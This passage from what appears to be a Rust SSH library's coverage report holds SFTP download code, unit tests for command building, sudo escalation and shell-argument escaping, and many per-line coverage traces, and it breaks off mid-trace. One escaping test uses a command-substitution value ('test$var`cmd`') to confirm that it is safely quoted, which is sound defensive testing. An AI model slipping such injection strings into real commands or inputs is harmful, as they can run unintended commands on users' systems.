sftp.metadata(\u0026path_str).await.map_err(|e| {\n            ConnectionError::TransferFailed(format!(\"Failed to get metadata: {}\", e))\n        })?;\n        let size = attrs.size.unwrap_or(0);\n        let mut prog = TransferProgress::download(remote, size);\n        progress(\u0026prog);\n        let mut remote_file = sftp\n            .open(\u0026path_str)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to open: {}\", e)))?;\n        if let Some(p) = local.parent() {\n            tokio::fs::create_dir_all(p).await.map_err(|e| {\n                ConnectionError::TransferFailed(format!(\"Failed to create dir: {}\", e))\n            })?;\n        }\n        let mut local_file = tokio::fs::File::create(local)\n            .await\n            .map_err(|e| ConnectionError::TransferFailed(format!(\"Failed to create: {}\", e)))?;\n        prog.phase = TransferPhase::Transferring;\n        let mut buf = vec![0u8; CHUNK_SIZE];\n        let mut read_total = 0u64;\n        loop {\n            let n = remote_file\n                .read(\u0026mut buf)\n                .await\n                .map_err(|e| ConnectionError::TransferFailed(format!(\"Read error: {}\", e)))?;\n            if n == 0 {\n                break;\n            }\n            local_file\n                .write_all(\u0026buf[..n])\n                .await\n                .map_err(|e| ConnectionError::TransferFailed(format!(\"Write error: {}\", e)))?;\n            read_total += n as u64;\n            prog.update(read_total);\n            progress(\u0026prog);\n        }\n        prog.phase = TransferPhase::Completed;\n        progress(\u0026prog);\n        Ok(())\n    }\n}\n\n#[cfg(test)]\nmod tests {\n    use super::*;\n\n    #[test]\n    fn test_russh_connection_builder() {\n        let builder = RusshConnectionBuilder::new(\"example.com\")\n            .port(2222)\n            .user(\"admin\")\n            .compression(true);\n\n        assert_eq!(builder.host, \"example.com\");\n        assert_eq!(builder.port, 2222);\n        assert_eq!(builder.user, \"admin\");\n        assert!(builder.compression);\n    }\n\n    #[test]\n    fn test_build_command_basic() {\n        let options = ExecuteOptions::default();\n        let cmd = RusshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_cwd() {\n        let options = ExecuteOptions::new().with_cwd(\"/tmp\");\n        let cmd = RusshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"cd /tmp \u0026\u0026 echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_escalation() {\n        let options = ExecuteOptions::new().with_escalation(Some(\"admin\".to_string()));\n        let cmd = RusshConnection::build_command(\"echo hello\", \u0026options);\n        assert_eq!(cmd, \"sudo -u admin -- echo hello\");\n    }\n\n    #[test]\n    fn test_build_command_with_cwd_and_escalation() {\n        let options = ExecuteOptions::new()\n            .with_cwd(\"/var/log\")\n            .with_escalation(None);\n        let cmd = RusshConnection::build_command(\"cat syslog\", \u0026options);\n        assert_eq!(cmd, \"cd /var/log \u0026\u0026 sudo -u root -- cat syslog\");\n    }\n\n    #[test]\n    fn test_escape_shell_arg_simple() {\n        assert_eq!(escape_shell_arg(\"hello\"), \"'hello'\");\n    }\n\n    #[test]\n    fn test_escape_shell_arg_with_spaces() {\n        assert_eq!(\n            escape_shell_arg(\"/path/with spaces/file.txt\"),\n            \"'/path/with spaces/file.txt'\"\n        );\n    }\n\n    #[test]\n    fn test_escape_shell_arg_with_quotes() {\n        assert_eq!(escape_shell_arg(\"it's a test\"), \"'it'\\\\''s a test'\");\n    }\n\n    #[test]\n    fn test_escape_shell_arg_with_special_chars() {\n        assert_eq!(escape_shell_arg(\"test$var`cmd`\"), \"'test$var`cmd`'\");\n    }\n\n    #[test]\n    fn test_max_concurrent_channels_constant() {\n        // Ensure we have a reasonable limit on concurrent channels\n        assert_eq!(MAX_CONCURRENT_CHANNELS, 10);\n        assert!(MAX_CONCURRENT_CHANNELS \u003e 0);\n        assert!(MAX_CONCURRENT_CHANNELS \u003c= 20); // SSH servers typically support at least 10\n    }\n\n    #[test]\n    fn test_pending_command_new() {\n        let cmd = PendingCommand::new(\"echo hello\", None);\n        assert_eq!(cmd.command(), \"echo hello\");\n        assert_eq!(cmd.options().cwd, None);\n        assert!(!cmd.options().escalate);\n    }\n\n    #[test]\n    fn test_pending_command_with_options() {\n        let options = ExecuteOptions::new().with_cwd(\"/tmp\").with_timeout(30);\n        let cmd = PendingCommand::new(\"echo hello\", Some(options));\n        assert_eq!(cmd.command(), \"echo hello\");\n        assert_eq!(cmd.options().cwd, Some(\"/tmp\".to_string()));\n        assert_eq!(cmd.options().timeout, Some(30));\n    }\n}\n","traces":[{"line":60,"address":[27960448,27960576],"length":1,"stats":{"Line":0}},{"line":62,"address":[27960477,27960609],"length":1,"stats":{"Line":0}},{"line":71,"address":[27960704,27960832],"length":1,"stats":{"Line":0}},{"line":73,"address":[27960733,27960865],"length":1,"stats":{"Line":0}},{"line":82,"address":[32883312],"length":1,"stats":{"Line":0}},{"line":83,"address":[32883338,32883322],"length":1,"stats":{"Line":0}},{"line":84,"address":[32883329],"length":1,"stats":{"Line":0}},{"line":86,"address":[32883345],"length":1,"stats":{"Line":0}},{"line":91,"address":[32883440],"length":1,"stats":{"Line":0}},{"line":92,"address":[32883445],"length":1,"stats":{"Line":0}},{"line":96,"address":[32883472],"length":1,"stats":{"Line":0}},{"line":97,"address":[32883487],"length":1,"stats":{"Line":0}},{"line":98,"address":[32883506,32883530,32883491],"length":1,"stats":{"Line":0}},{"line":99,"address":[32883520],"length":1,"stats":{"Line":0}},{"line":101,"address":[32883501],"length":1,"stats":{"Line":0}},{"line":146,"address":[32884896],"length":1,"stats":{"Line":0}},{"line":159,"address":[32884624],"length":1,"stats":{"Line":0}},{"line":160,"address":[32884634,32884745],"length":1,"stats":{"Line":0}},{"line":161,"address":[32884761,32884646],"length":1,"stats":{"Line":0}},{"line":162,"address":[32884747],"length":1,"stats":{"Line":0}},{"line":164,"address":[32884768],"length":1,"stats":{"Line":0}},{"line":167,"address":[32884660],"length":1,"stats":{"Line":0}},{"line":172,"address":[32884864],"length":1,"stats":{"Line":0}},{"line":173,"address":[32884869],"length":1,"stats":{"Line":0}},{"line":193,"address":[32884512],"length":1,"stats":{"Line":0}},{"line":194,"address":[32884517],"length":1,"stats":{"Line":0}},{"line":197,"address":[32884528],"length":1,"stats":{"Line":0}},{"line":198,"address":[32884560],"length":1,"stats":{"Line":0}},{"line":200,"address":[27982080,27982105],"length":1,"stats":{"Line":0}},{"line":241,"address":[32885680],"length":1,"stats":{"Line":0}},{"line":242,"address":[32885688],"length":1,"stats":{"Line":0}},{"line":245,"address":[32885588,32885424],"length":1,"stats":{"Line":0}},{"line":246,"address":[32885456,32885544],"length":1,"stats":{"Line":0}},{"line":247,"address":[32885568],"length":1,"stats":{"Line":0}},{"line":250,"address":[32885616],"length":1,"stats":{"Line":0}},{"line":251,"address":[32885639],"length":1,"stats":{"Line":0}},{"line":252,"address":[32885647],"length":1,"stats":{"Line":0}},{"line":255,"address":[32885328],"length":1,"stats":{"Line":0}},{"line":256,"address":[32885351],"length":1,"stats":{"Line":0}},{"line":257,"address":[32885359],"length":1,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":267,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[32885216],"length":1,"stats":{"Line":0}},{"line":271,"address":[32885233],"length":1,"stats":{"Line":0}},{"line":272,"address":[32885244],"length":1,"stats":{"Line":0}},{"line":275,"address":[32885264],"length":1,"stats":{"Line":0}},{"line":276,"address":[32885281],"length":1,"stats":{"Line":0}},{"line":277,"address":[32885293],"length":1,"stats":{"Line":0}},{"line":280,"address":[32885392],"length":1,"stats":{"Line":0}},{"line":281,"address":[32885400],"length":1,"stats":{"Line":0}},{"line":289,"address":[32883805,32883799,32883552],"length":1,"stats":{"Line":1}},{"line":290,"address":[32883585],"length":1,"stats":{"Line":1}},{"line":327,"address":[32878327,32878321,32878064],"length":1,"stats":{"Line":0}},{"line":328,"address":[32878134],"length":1,"stats":{"Line":0}},{"line":330,"address":[32878149],"length":1,"stats":{"Line":0}},{"line":338,"address":[32876114,32875378,32873440],"length":1,"stats":{"Line":0}},{"line":339,"address":[32873463],"length":1,"stats":{"Line":0}},{"line":342,"address":[27827899,27827872],"length":1,"stats":{"Line":0}},{"line":344,"address":[32873591],"length":1,"stats":{"Line":0}},{"line":345,"address":[32873636,32873805],"length":1,"stats":{"Line":0}},{"line":346,"address":[32873675],"length":1,"stats":{"Line":0}},{"line":350,"address":[32873923,32873974],"length":1,"stats":{"Line":0}},{"line":351,"address":[32874058],"length":1,"stats":{"Line":0}},{"line":352,"address":[32874011],"length":1,"stats":{"Line":0}},{"line":353,"address":[32874027,32875719,32875435],"length":1,"stats":{"Line":0}},{"line":354,"address":[32875666],"length":1,"stats":{"Line":0}},{"line":358,"address":[32874130,32874221],"length":1,"stats":{"Line":0}},{"line":359,"address":[32874407,32875151],"length":1,"stats":{"Line":0}},{"line":361,"address":[32875183],"length":1,"stats":{"Line":0}},{"line":366,"address":[32875270],"length":1,"stats":{"Line":0}},{"line":367,"address":[32875366],"length":1,"stats":{"Line":0}},{"line":371,"address":[32874433,32874794],"length":1,"stats":{"Line":0}},{"line":372,"address":[32874741],"length":1,"stats":{"Line":0}},{"line":376,"address":[32878045,32876144,32877324],"length":1,"stats":{"Line":0}},{"line":377,"address":[32876183],"length":1,"stats":{"Line":0}},{"line":378,"address":[32876249,32876320],"length":1,"stats":{"Line":0}},{"line":379,"address":[32876372],"length":1,"stats":{"Line":0}},{"line":383,"address":[32876326,32876398],"length":1,"stats":{"Line":0}},{"line":386,"address":[32876483,32876565],"length":1,"stats":{"Line":0}},{"line":387,"address":[32876588],"length":1,"stats":{"Line":0}},{"line":390,"address":[32876652],"length":1,"stats":{"Line":0}},{"line":392,"address":[32876737],"length":1,"stats":{"Line":0}},{"line":393,"address":[32876719],"length":1,"stats":{"Line":0}},{"line":398,"address":[32876884,32876801],"length":1,"stats":{"Line":0}},{"line":399,"address":[32876959],"length":1,"stats":{"Line":0}},{"line":402,"address":[32877670,32876935,32877390],"length":1,"stats":{"Line":0}},{"line":403,"address":[32877621],"length":1,"stats":{"Line":0}},{"line":407,"address":[32877053],"length":1,"stats":{"Line":0}},{"line":411,"address":[32872224],"length":1,"stats":{"Line":0}},{"line":413,"address":[32872265],"length":1,"stats":{"Line":0}},{"line":414,"address":[32872310],"length":1,"stats":{"Line":0}},{"line":415,"address":[32872367],"length":1,"stats":{"Line":0}},{"line":416,"address":[32872432],"length":1,"stats":{"Line":0}},{"line":417,"address":[32872517,32872410,32872442],"length":1,"stats":{"Line":0}},{"line":418,"address":[27827664,27827678],"length":1,"stats":{"Line":0}},{"line":420,"address":[32872495,32872530],"length":1,"stats":{"Line":0}},{"line":425,"address":[32872295,32872573],"length":1,"stats":{"Line":0}},{"line":426,"address":[32872620],"length":1,"stats":{"Line":0}},{"line":430,"address":[32872627,32872593],"length":1,"stats":{"Line":0}},{"line":431,"address":[32872654],"length":1,"stats":{"Line":0}},{"line":434,"address":[32872687],"length":1,"stats":{"Line":0}},{"line":438,"address":[32872186,32872192,32871184],"length":1,"stats":{"Line":0}},{"line":439,"address":[32871233],"length":1,"stats":{"Line":0}},{"line":440,"address":[32871262],"length":1,"stats":{"Line":0}},{"line":442,"address":[32871284],"length":1,"stats":{"Line":0}},{"line":443,"address":[32871350],"length":1,"stats":{"Line":0}},{"line":446,"address":[32871491],"length":1,"stats":{"Line":0}},{"line":447,"address":[32871686],"length":1,"stats":{"Line":0}},{"line":450,"address":[32871581],"length":1,"stats":{"Line":0}},{"line":451,"address":[32871631],"length":1,"stats":{"Line":0}},{"line":452,"address":[32871806,32871748],"length":1,"stats":{"Line":0}},{"line":453,"address":[32872002,32872068],"length":1,"stats":{"Line":0}},{"line":454,"address":[32872148],"length":1,"stats":{"Line":0}},{"line":457,"address":[32872019],"length":1,"stats":{"Line":0}},{"line":461,"address":[32871533],"length":1,"stats":{"Line":0}},{"line":462,"address":[32872205],"length":1,"stats":{"Line":0}},{"line":466,"address":[32871422],"length":1,"stats":{"Line":0}},{"line":467,"address":[32872212],"length":1,"stats":{"Line":0}},{"line":473,"address":[32871376],"length":1,"stats":{"Line":0}},{"line":477,"address":[32872704],"length":1,"stats":{"Line":0}},{"line":478,"address":[32872737,32872756],"length":1,"stats":{"Line":0}},{"line":479,"address":[32872852,32872817],"length":1,"stats":{"Line":0}},{"line":480,"address":[32872913],"length":1,"stats":{"Line":0}},{"line":482,"address":[32872998],"length":1,"stats":{"Line":0}},{"line":483,"address":[32873036],"length":1,"stats":{"Line":0}},{"line":486,"address":[32873193,32873011,32873046],"length":1,"stats":{"Line":0}},{"line":490,"address":[32873183],"length":1,"stats":{"Line":0}},{"line":496,"address":[32872835],"length":1,"stats":{"Line":0}},{"line":500,"address":[32871162,32871168,32870976],"length":1,"stats":{"Line":0}},{"line":502,"address":[32871001,32871081],"length":1,"stats":{"Line":0}},{"line":510,"address":[27824726,27824575,27824781,27827226,27824652,27824835,27825590,27824528],"length":1,"stats":{"Line":0}},{"line":514,"address":[27824881,27824755],"length":1,"stats":{"Line":0}},{"line":516,"address":[27825005,27824916,27825295],"length":1,"stats":{"Line":0}},{"line":517,"address":[27825270],"length":1,"stats":{"Line":0}},{"line":520,"address":[27824952,27825946,27826464],"length":1,"stats":{"Line":0}},{"line":521,"address":[27826469,27825623,27826221],"length":1,"stats":{"Line":0}},{"line":526,"address":[27826444],"length":1,"stats":{"Line":0}},{"line":528,"address":[27825951,27825595,27825661],"length":1,"stats":{"Line":0}},{"line":532,"address":[27825926],"length":1,"stats":{"Line":0}},{"line":537,"address":[27826727,27824967,27826975],"length":1,"stats":{"Line":0}},{"line":541,"address":[27826950],"length":1,"stats":{"Line":0}},{"line":569,"address":[32880474,32880468,32878704],"length":1,"stats":{"Line":1}},{"line":570,"address":[32878769],"length":1,"stats":{"Line":1}},{"line":573,"address":[32878791],"length":1,"stats":{"Line":1}},{"line":574,"address":[32878863,32878960],"length":1,"stats":{"Line":2}},{"line":578,"address":[32878898],"length":1,"stats":{"Line":1}},{"line":579,"address":[32879132],"length":1,"stats":{"Line":1}},{"line":580,"address":[32879250],"length":1,"stats":{"Line":1}},{"line":583,"address":[32879354],"length":1,"stats":{"Line":1}},{"line":584,"address":[32879428,32880014],"length":1,"stats":{"Line":2}},{"line":585,"address":[32880063,32880225],"length":1,"stats":{"Line":0}},{"line":587,"address":[32880093,32880028],"length":1,"stats":{"Line":2}},{"line":590,"address":[32879397,32879454],"length":1,"stats":{"Line":0}},{"line":591,"address":[32879501,32879878],"length":1,"stats":{"Line":0}},{"line":593,"address":[32879470,32879535],"length":1,"stats":{"Line":0}},{"line":594,"address":[32879746,32879584],"length":1,"stats":{"Line":0}},{"line":597,"address":[32879549,32879614],"length":1,"stats":{"Line":0}},{"line":602,"address":[32880357,32879102],"length":1,"stats":{"Line":2}},{"line":603,"address":[32880384],"length":1,"stats":{"Line":1}},{"line":610,"address":[32881568,32882266,32882368],"length":1,"stats":{"Line":0}},{"line":611,"address":[32881624],"length":1,"stats":{"Line":0}},{"line":614,"address":[32881643,32881703],"length":1,"stats":{"Line":0}},{"line":615,"address":[32881770,32881714],"length":1,"stats":{"Line":0}},{"line":618,"address":[32881918],"length":1,"stats":{"Line":0}},{"line":619,"address":[32881990,32882077],"length":1,"stats":{"Line":0}},{"line":624,"address":[32881760,32882272],"length":1,"stats":{"Line":0}},{"line":625,"address":[32882296],"length":1,"stats":{"Line":0}},{"line":629,"address":[27958887,27957936,27958064,27958133,27958243,27958001,27958098,27958113],"length":1,"stats":{"Line":0}},{"line":630,"address":[27958274,27958057,27958091,27958811,27958188,27958567,27960192,27960426],"length":1,"stats":{"Line":0}},{"line":631,"address":[27960278,27960214],"length":1,"stats":{"Line":0}},{"line":634,"address":[25964993],"length":1,"stats":{"Line":0}},{"line":635,"address":[27959766,27959702],"length":1,"stats":{"Line":0}},{"line":638,"address":[27958118,27959430,27959936,27960170,27959261],"length":1,"stats":{"Line":0}},{"line":639,"address":[27960022,27959958],"length":1,"stats":{"Line":0}},{"line":644,"address":[32882800,32882818],"length":1,"stats":{"Line":0}},{"line":645,"address":[27923108],"length":1,"stats":{"Line":0}},{"line":647,"address":[27923780,27923274,27923327,27923213],"length":1,"stats":{"Line":0}},{"line":648,"address":[27923880],"length":1,"stats":{"Line":0}},{"line":651,"address":[27924081],"length":1,"stats":{"Line":0}},{"line":656,"address":[26014441,26014423],"length":1,"stats":{"Line":0}},{"line":659,"address":[27923972],"length":1,"stats":{"Line":0}},{"line":665,"address":[32883120],"length":1,"stats":{"Line":0}},{"line":672,"address":[27954784,27957899,27954623,27957888],"length":1,"stats":{"Line":0}},{"line":673,"address":[27954791],"length":1,"stats":{"Line":0}},{"line":675,"address":[27954868],"length":1,"stats":{"Line":0}},{"line":676,"address":[27955030],"length":1,"stats":{"Line":0}},{"line":677,"address":[27955110],"length":1,"stats":{"Line":0}},{"line":678,"address":[27955264],"length":1,"stats":{"Line":0}},{"line":680,"address":[27955343,27955716],"length":1,"stats":{"Line":0}},{"line":687,"address":[27955636,27956159],"length":1,"stats":{"Line":0}},{"line":691,"address":[27956390],"length":1,"stats":{"Line":0}},{"line":693,"address":[27956404],"length":1,"stats":{"Line":0}},{"line":694,"address":[27956418],"length":1,"stats":{"Line":0}},{"line":697,"address":[27956428],"length":1,"stats":{"Line":0}},{"line":699,"address":[27956553,27956838,27956903,27954706,27956601,27956654],"length":1,"stats":{"Line":0}},{"line":701,"address":[27957427],"length":1,"stats":{"Line":0}},{"line":702,"address":[27957048],"length":1,"stats":{"Line":0}},{"line":703,"address":[27957085,27957239],"length":1,"stats":{"Line":0}},{"line":704,"address":[27957272],"length":1,"stats":{"Line":0}},{"line":705,"address":[27957368,27957313],"length":1,"stats":{"Line":0}},{"line":710,"address":[32880832],"length":1,"stats":{"Line":0}},{"line":719,"address":[27866632],"length":1,"stats":{"Line":0}},{"line":721,"address":[27866809,27868488,27866650],"length":1,"stats":{"Line":0}},{"line":722,"address":[27868557],"length":1,"stats":{"Line":0}},{"line":723,"address":[27868826],"length":1,"stats":{"Line":0}},{"line":724,"address":[27868966,27869268],"length":1,"stats":{"Line":0}},{"line":725,"address":[27866711,27866925,27869597,27869226,27869670],"length":1,"stats":{"Line":0}},{"line":728,"address":[25989147],"length":1,"stats":{"Line":0}},{"line":729,"address":[27867298],"length":1,"stats":{"Line":0}},{"line":730,"address":[27867219],"length":1,"stats":{"Line":0}},{"line":731,"address":[27867957,27867259,27867595],"length":1,"stats":{"Line":0}},{"line":732,"address":[27868311,27867868],"length":1,"stats":{"Line":0}},{"line":737,"address":[27868583,27870080],"length":1,"stats":{"Line":0}},{"line":738,"address":[27870094],"length":1,"stats":{"Line":0}},{"line":743,"address":[32878400],"length":1,"stats":{"Line":0}},{"line":752,"address":[27828836],"length":1,"stats":{"Line":0}},{"line":753,"address":[27829011],"length":1,"stats":{"Line":0}},{"line":756,"address":[27829416,27829230],"length":1,"stats":{"Line":0}},{"line":758,"address":[27829045],"length":1,"stats":{"Line":0}},{"line":763,"address":[27829090],"length":1,"stats":{"Line":0}},{"line":768,"address":[27829125],"length":1,"stats":{"Line":0}},{"line":774,"address":[27829160],"length":1,"stats":{"Line":0}},{"line":776,"address":[27829195],"length":1,"stats":{"Line":0}},{"line":778,"address":[27829621,27829764],"length":1,"stats":{"Line":0}},{"line":781,"address":[27829774,27829880],"length":1,"stats":{"Line":0}},{"line":782,"address":[27830772,27830637,27830196,27830457,27830030,27830135,27830570,27831490,27830839,27831452],"length":1,"stats":{"Line":0}},{"line":783,"address":[27830505,27830229,27828884,27830181,27830308],"length":1,"stats":{"Line":0}},{"line":784,"address":[27830605,27834318,27830527,27834288],"length":1,"stats":{"Line":0}},{"line":785,"address":[27833697,27833392,27830726,27833691],"length":1,"stats":{"Line":0}},{"line":786,"address":[27833503,27833422],"length":1,"stats":{"Line":0}},{"line":790,"address":[27830990,27833712,27833961,27833955,27831427,27831072,27831162],"length":1,"stats":{"Line":0}},{"line":791,"address":[27833807,27833739],"length":1,"stats":{"Line":0}},{"line":796,"address":[27831203],"length":1,"stats":{"Line":0}},{"line":798,"address":[27832129,27831855,27831788,27831247,27831375,27831655],"length":1,"stats":{"Line":0}},{"line":799,"address":[27828905,27831735,27831506,27831360,27831408],"length":1,"stats":{"Line":0}},{"line":800,"address":[27834032,27834261,27831765],"length":1,"stats":{"Line":0}},{"line":801,"address":[27834114,27834054],"length":1,"stats":{"Line":0}},{"line":805,"address":[25966073],"length":1,"stats":{"Line":0}},{"line":807,"address":[27832815,27832453],"length":1,"stats":{"Line":0}},{"line":808,"address":[27832713],"length":1,"stats":{"Line":0}},{"line":812,"address":[32878528],"length":1,"stats":{"Line":0}},{"line":819,"address":[27834544],"length":1,"stats":{"Line":0}},{"line":820,"address":[25973487],"length":1,"stats":{"Line":0}},{"line":821,"address":[27835762,27836079],"length":1,"stats":{"Line":0}},{"line":822,"address":[27836062],"length":1,"stats":{"Line":0}},{"line":828,"address":[27834695,27835292],"length":1,"stats":{"Line":0}},{"line":829,"address":[27835393,27835300],"length":1,"stats":{"Line":0}},{"line":830,"address":[27835563,27835412,27835710,27836521,27836665],"length":1,"stats":{"Line":0}},{"line":831,"address":[27836375,27834611,27835695,27835740,27836585],"length":1,"stats":{"Line":0}},{"line":834,"address":[27837131,27836793],"length":1,"stats":{"Line":0}},{"line":835,"address":[27837101],"length":1,"stats":{"Line":0}},{"line":840,"address":[27837949,27836767,27836751,27835331],"length":1,"stats":{"Line":0}},{"line":841,"address":[27838200,27838004],"length":1,"stats":{"Line":0}},{"line":842,"address":[27838469,27838219,27837876,27837687],"length":1,"stats":{"Line":0}},{"line":843,"address":[27837514,27837541,27838454,27838494,27837751,27834632],"length":1,"stats":{"Line":0}},{"line":846,"address":[27838837,27838499],"length":1,"stats":{"Line":0}},{"line":847,"address":[27838807],"length":1,"stats":{"Line":0}},{"line":852,"address":[27838038,27839715,27838148],"length":1,"stats":{"Line":0}},{"line":853,"address":[27839591,27839399,27840285,27839782,27840138],"length":1,"stats":{"Line":0}},{"line":854,"address":[27839463,27840310,27839220,27840270,27834653,27839250],"length":1,"stats":{"Line":0}},{"line":857,"address":[27840653,27840315],"length":1,"stats":{"Line":0}},{"line":858,"address":[27840623],"length":1,"stats":{"Line":0}},{"line":863,"address":[27839878],"length":1,"stats":{"Line":0}},{"line":864,"address":[27840046,27841169,27839954,27841366,27841299,27842015],"length":1,"stats":{"Line":0}},{"line":865,"address":[27839958],"length":1,"stats":{"Line":0}},{"line":866,"address":[27841249,27841023,27840031,27840076,27834674],"length":1,"stats":{"Line":0}},{"line":867,"address":[27842458,27841276,27842224],"length":1,"stats":{"Line":0}},{"line":868,"address":[27842246,27842310],"length":1,"stats":{"Line":0}},{"line":874,"address":[27841418],"length":1,"stats":{"Line":0}},{"line":875,"address":[27841588,27841828,27841427],"length":1,"stats":{"Line":0}},{"line":876,"address":[27841811],"length":1,"stats":{"Line":0}},{"line":880,"address":[27841455],"length":1,"stats":{"Line":0}},{"line":881,"address":[27839981],"length":1,"stats":{"Line":0}},{"line":889,"address":[32880608],"length":1,"stats":{"Line":0}},{"line":894,"address":[27853805,27854013,27860538,27854360,27853915,27854660,27853756,27860304],"length":1,"stats":{"Line":0}},{"line":895,"address":[27860326,27860390],"length":1,"stats":{"Line":0}},{"line":899,"address":[25978350],"length":1,"stats":{"Line":0}},{"line":900,"address":[27860086,27860022],"length":1,"stats":{"Line":0}},{"line":903,"address":[27855213,27855147],"length":1,"stats":{"Line":0}},{"line":904,"address":[27856033],"length":1,"stats":{"Line":0}},{"line":905,"address":[27855247],"length":1,"stats":{"Line":0}},{"line":909,"address":[27855219,27855618,27855288],"length":1,"stats":{"Line":0}},{"line":912,"address":[27856006,27858670,27855561,27855938],"length":1,"stats":{"Line":0}},{"line":913,"address":[27859321,27859038,27858735],"length":1,"stats":{"Line":0}},{"line":917,"address":[27859642,27856487,27859269,27856412],"length":1,"stats":{"Line":0}},{"line":918,"address":[27859529,27859278],"length":1,"stats":{"Line":0}},{"line":919,"address":[25978365],"length":1,"stats":{"Line":0}},{"line":920,"address":[27856559],"length":1,"stats":{"Line":0}},{"line":922,"address":[27856766,27856623],"length":1,"stats":{"Line":0}},{"line":924,"address":[27856800,27857411,27857733],"length":1,"stats":{"Line":0}},{"line":925,"address":[27857684],"length":1,"stats":{"Line":0}},{"line":929,"address":[27856776,27856895,27857205],"length":1,"stats":{"Line":0}},{"line":931,"address":[27856651],"length":1,"stats":{"Line":0}},{"line":933,"address":[27858160,27858411,27856739],"length":1,"stats":{"Line":0}},{"line":938,"address":[27858865],"length":1,"stats":{"Line":0}},{"line":939,"address":[27858781],"length":1,"stats":{"Line":0}},{"line":948,"address":[32878592],"length":1,"stats":{"Line":0}},{"line":954,"address":[27842702,27842809],"length":1,"stats":{"Line":0}},{"line":955,"address":[27842916],"length":1,"stats":{"Line":0}},{"line":957,"address":[27842820,27842892],"length":1,"stats":{"Line":0}},{"line":962,"address":[27842845,27843249,27843798],"length":1,"stats":{"Line":0}},{"line":964,"address":[27845308,27843589,27843338,27844928,27843452,27843275],"length":1,"stats":{"Line":0}},{"line":965,"address":[27845089],"length":1,"stats":{"Line":0}},{"line":967,"address":[27844992,27845065],"length":1,"stats":{"Line":0}},{"line":973,"address":[27843908,27843599,27845708,27843303,27843713,27845328],"length":1,"stats":{"Line":0}},{"line":974,"address":[27845489],"length":1,"stats":{"Line":0}},{"line":976,"address":[27845392,27845465],"length":1,"stats":{"Line":0}},{"line":983,"address":[27844074,27844217,27844284,27844517,27843866],"length":1,"stats":{"Line":0}},{"line":984,"address":[27843567,27843831],"length":1,"stats":{"Line":0}},{"line":985,"address":[25974071],"length":1,"stats":{"Line":0}},{"line":986,"address":[27844170,27844908,27844528],"length":1,"stats":{"Line":0}},{"line":987,"address":[27844689],"length":1,"stats":{"Line":0}},{"line":989,"address":[27844665,27844592],"length":1,"stats":{"Line":0}},{"line":994,"address":[27844383,27844336,27844512],"length":1,"stats":{"Line":0}},{"line":995,"address":[27844371],"length":1,"stats":{"Line":0}},{"line":997,"address":[27844388],"length":1,"stats":{"Line":0}},{"line":998,"address":[27844340],"length":1,"stats":{"Line":0}},{"line":1006,"address":[32887040],"length":1,"stats":{"Line":0}},{"line":1007,"address":[32887045],"length":1,"stats":{"Line":0}},{"line":1010,"address":[32888009],"length":1,"stats":{"Line":0}},{"line":1012,"address":[28047461,28047349],"length":1,"stats":{"Line":0}},{"line":1013,"address":[28047482],"length":1,"stats":{"Line":0}},{"line":1017,"address":[28047291,28047497,28047638],"length":1,"stats":{"Line":0}},{"line":1018,"address":[28047941],"length":1,"stats":{"Line":0}},{"line":1019,"address":[28047947],"length":1,"stats":{"Line":0}},{"line":1028,"address":[32887782],"length":1,"stats":{"Line":0}},{"line":1033,"address":[28029443],"length":1,"stats":{"Line":0}},{"line":1037,"address":[28029720,28029623],"length":1,"stats":{"Line":0}},{"line":1039,"address":[28029797,28030177,28029727],"length":1,"stats":{"Line":0}},{"line":1042,"address":[28032000,28032127,28032106,28035490,28032312,28031885,28032043,28032085,28032987,28031808,28030033,28032064],"length":1,"stats":{"Line":0}},{"line":1045,"address":[28032219,28032030,28032346,28031934],"length":1,"stats":{"Line":0}},{"line":1046,"address":[28032812,28032745,28032959,28032616],"length":1,"stats":{"Line":0}},{"line":1048,"address":[28039091,28032780,28039088,28032722],"length":1,"stats":{"Line":0}},{"line":1051,"address":[28039338,28032866,28033001,28032051,28033345,28033671,28039104],"length":1,"stats":{"Line":0}},{"line":1052,"address":[28039126,28039190],"length":1,"stats":{"Line":0}},{"line":1056,"address":[28033442],"length":1,"stats":{"Line":0}},{"line":1059,"address":[26137481],"length":1,"stats":{"Line":0}},{"line":1060,"address":[28038918,28038854],"length":1,"stats":{"Line":0}},{"line":1064,"address":[28034083,28034126],"length":1,"stats":{"Line":0}},{"line":1065,"address":[28034169],"length":1,"stats":{"Line":0}},{"line":1066,"address":[28034275],"length":1,"stats":{"Line":0}},{"line":1067,"address":[28034424,28034529],"length":1,"stats":{"Line":0}},{"line":1068,"address":[26137502],"length":1,"stats":{"Line":0}},{"line":1069,"address":[28039382,28039446],"length":1,"stats":{"Line":0}},{"line":1074,"address":[28034100],"length":1,"stats":{"Line":0}},{"line":1075,"address":[28035199],"length":1,"stats":{"Line":0}},{"line":1076,"address":[28035270],"length":1,"stats":{"Line":0}},{"line":1079,"address":[26137523],"length":1,"stats":{"Line":0}},{"line":1080,"address":[28036000],"length":1,"stats":{"Line":0}},{"line":1081,"address":[28036137],"length":1,"stats":{"Line":0}},{"line":1082,"address":[28036153,28036384],"length":1,"stats":{"Line":0}},{"line":1084,"address":[28036195],"length":1,"stats":{"Line":0}},{"line":1086,"address":[28036237],"length":1,"stats":{"Line":0}},{"line":1087,"address":[28036416],"length":1,"stats":{"Line":0}},{"line":1090,"address":[28036281],"length":1,"stats":{"Line":0}},{"line":1091,"address":[28036295],"length":1,"stats":{"Line":0}},{"line":1107,"address":[28038794,28032135,28036566,28036085,28036641,28038560],"length":1,"stats":{"Line":0}},{"line":1108,"address":[28038582,28038646],"length":1,"stats":{"Line":0}},{"line":1114,"address":[28038822,28036936,28038816],"length":1,"stats":{"Line":0}},{"line":1115,"address":[28037080,28037010],"length":1,"stats":{"Line":0}},{"line":1116,"address":[28037243,28037310],"length":1,"stats":{"Line":0}},{"line":1118,"address":[28037732,28037465],"length":1,"stats":{"Line":0}},{"line":1120,"address":[28038301,28037713],"length":1,"stats":{"Line":0}},{"line":1121,"address":[28037981,28038210],"length":1,"stats":{"Line":0